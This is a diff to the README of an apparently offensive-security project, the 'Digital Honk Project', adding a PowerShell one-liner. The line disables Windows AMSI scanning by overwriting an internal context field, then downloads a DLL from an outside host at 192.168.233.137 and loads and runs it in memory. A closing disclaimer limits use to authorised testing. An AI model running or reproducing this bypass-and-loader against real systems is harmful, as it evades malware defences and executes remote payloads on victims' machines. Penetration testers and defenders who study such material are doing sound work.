@@ -50,6 +50,9 @@ try{
 }
 ```
 
+One Liner:
+`try{[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"}|%{($c=$_).GetFields('NonPublic,Static')|?{$_.Name -like "*Context"}|%{$g=$_.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)}}; $data=(New-Object System.Net.WebClient).DownloadData('http://192.168.233.137/honk.dll'); $assem=[System.Reflection.Assembly]::Load($data); [honk.Program]::appleBits()}catch{Write-Error "An error occurred: $_"}finally{Write-Host "Press Enter to exit...";[Console]::ReadLine()}`
+
 ## Disclaimer
 
 This project is designed for educational and ethical hacking purposes only. Ensure you have explicit authorization to test and use these techniques on any system. The creator and contributors of the Digital Honk Project assume no responsibility for misuse or damages caused by this project.
